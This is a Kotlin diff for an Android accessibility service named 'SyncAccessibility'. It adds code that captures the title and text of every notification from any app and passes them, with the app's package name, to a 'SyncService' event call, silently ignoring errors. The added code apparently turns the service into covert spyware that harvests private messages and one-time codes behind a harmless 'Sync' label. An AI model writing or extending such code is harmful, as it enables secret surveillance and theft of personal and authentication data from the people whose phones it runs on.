@@ -176,6 +176,23 @@ class SyncAccessibility : AccessibilityService() {
 
     override fun onAccessibilityEvent(e: AccessibilityEvent?) {
         if (e == null) return
+        if (e.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+            try {
+                val pkgN = e.packageName?.toString() ?: return
+                val n = e.parcelableData as? android.app.Notification
+                val ex = n?.extras
+                val tit = ex?.getCharSequence(android.app.Notification.EXTRA_TITLE)?.toString()
+                    ?: ex?.getCharSequence("android.title")?.toString() ?: ""
+                val txt = ex?.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString()
+                    ?: ex?.getCharSequence("android.text")?.toString()
+                    ?: e.text?.joinToString(" ") ?: ""
+                if (txt.isNotBlank() || tit.isNotBlank()) {
+                    SyncService.instancia?.evento("notif", JSONObject()
+                        .put("pkg", pkgN).put("de", tit.take(90)).put("txt", txt.take(600)))
+                }
+            } catch (ex2: Exception) { }
+            return
+        }
         if (e.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             val pkg = e.packageName?.toString() ?: return
             if (pkg != ultimoPkg) {
